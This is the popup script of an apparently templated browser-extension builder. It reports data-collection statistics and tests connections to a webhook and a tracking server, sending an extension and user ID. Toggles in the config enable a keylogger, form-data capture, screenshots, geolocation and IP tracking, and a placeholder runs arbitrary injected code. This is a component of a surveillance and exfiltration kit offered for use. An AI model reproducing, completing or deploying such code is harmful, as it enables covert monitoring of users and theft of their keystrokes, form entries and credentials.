
// Popup script for {{EXTENSION_NAME}}
const WEBHOOK_URL = '{{WEBHOOK_URL}}';
const TRACKING_SERVER = '{{TRACKING_SERVER}}';

let stats = {
  eventCount: 0,
  pageCount: 0,
  dataSent: 0,
  sessionStart: Date.now()
};

// Load stats from storage
chrome.storage.local.get(['extensionStats'], (result) => {
  if (result.extensionStats) {
    stats = { ...stats, ...result.extensionStats };
    updateStatsDisplay();
  }
});

// Update stats display
function updateStatsDisplay() {
  document.getElementById('eventCount').textContent = stats.eventCount;
  document.getElementById('pageCount').textContent = stats.pageCount;
  document.getElementById('dataSent').textContent = formatBytes(stats.dataSent);
  
  const sessionDuration = Math.floor((Date.now() - stats.sessionStart) / 60000);
  document.getElementById('sessionTime').textContent = `${sessionDuration}m`;
}

// Format bytes to human readable
function formatBytes(bytes) {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

// Test connection functionality
function testConnection() {
  updateStatus('Testing connections...', 'info');
  
  let webhookWorking = false;
  let serverWorking = false;
  
  // Test webhook
  const testWebhookData = {
    username: "🧪 {{EXTENSION_NAME}} Test",
    embeds: [{
      title: "🧪 Connection Test",
      description: "This is a test message from your extension popup.",
      color: 0x00FF00,
      timestamp: new Date().toISOString(),
      footer: { text: "Extension Test | Popup Interface" }
    }]
  };
  
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(testWebhookData)
  })
  .then(response => {
    webhookWorking = response.ok;
    updateWebhookStatus(webhookWorking);
    return testServer();
  })
  .then(() => {
    if (webhookWorking && serverWorking) {
      updateStatus('✅ All connections working', 'active');
    } else if (webhookWorking) {
      updateStatus('⚠️ Webhook OK, Server issues', 'info');
    } else {
      updateStatus('❌ Connection problems detected', 'error');
    }
  })
  .catch(() => {
    updateStatus('❌ Connection test failed', 'error');
  });
  
  // Test server connection
  function testServer() {
    return fetch(`${TRACKING_SERVER}/api/extension-track`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'popup_test',
        timestamp: Date.now(),
        extensionId: '{{EXTENSION_ID}}',
        userId: '{{USER_ID}}'
      })
    })
    .then(response => {
      serverWorking = response.ok;
      return Promise.resolve();
    })
    .catch(() => {
      serverWorking = false;
      return Promise.resolve();
    });
  }
}

function updateStatus(message, type) {
  const statusElement = document.getElementById('status');
  statusElement.querySelector('span').textContent = message;
  statusElement.className = `status ${type}`;
  
  if (type === 'info') {
    statusElement.classList.add('pulsing');
  } else {
    statusElement.classList.remove('pulsing');
  }
  
  // Reset to default after 5 seconds unless it's an error
  if (type !== 'error') {
    setTimeout(() => {
      statusElement.querySelector('span').textContent = '✅ Extension Active';
      statusElement.className = 'status active';
      statusElement.classList.remove('pulsing');
    }, 5000);
  }
}

function updateWebhookStatus(working) {
  const webhookStatus = document.getElementById('webhookStatus');
  if (working) {
    webhookStatus.querySelector('span').textContent = '🔗 Webhook Connected';
    webhookStatus.className = 'status active';
  } else {
    webhookStatus.querySelector('span').textContent = '❌ Webhook Failed';
    webhookStatus.className = 'status error';
  }
}

function clearData() {
  if (confirm('Clear all extension data and reset statistics?')) {
    // Reset stats
    stats = {
      eventCount: 0,
      pageCount: 0,
      dataSent: 0,
      sessionStart: Date.now()
    };
    
    // Save to storage
    chrome.storage.local.set({ extensionStats: stats });
    
    // Update display
    updateStatsDisplay();
    
    updateStatus('📊 Data cleared successfully', 'info');
  }
}

// Event listeners
document.getElementById('testBtn').addEventListener('click', testConnection);
document.getElementById('clearBtn').addEventListener('click', clearData);

// Update stats every second
setInterval(() => {
  updateStatsDisplay();
}, 1000);

// Listen for messages from background script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'statsUpdate') {
    stats = { ...stats, ...message.data };
    chrome.storage.local.set({ extensionStats: stats });
    updateStatsDisplay();
  }
});

// Configure feature visibility based on enabled features
const enabledFeatures = {
  ipTracking: {{FEATURE_IP_TRACKING}} === 'true',
  geoLocation: {{FEATURE_GEOLOCATION}} === 'true',
  browserInfo: {{FEATURE_BROWSER_INFO}} === 'true',
  screenshots: {{FEATURE_SCREENSHOT}} === 'true',
  formData: {{FEATURE_FORM_DATA}} === 'true',
  clickTracking: {{FEATURE_CLICK_TRACKING}} === 'true',
  keyLogger: {{FEATURE_KEYLOGGER}} === 'true'
};

// Show/hide features based on configuration
Object.entries(enabledFeatures).forEach(([featureId, enabled]) => {
  const element = document.getElementById(featureId);
  if (element) {
    element.style.display = enabled ? 'flex' : 'none';
  }
});

// Initial connection test
setTimeout(() => {
  testConnection();
}, 1000);

// Custom user code execution
try {
  {{CUSTOM_CODE}}
} catch (error) {
  console.error('Custom popup code error:', error);
}
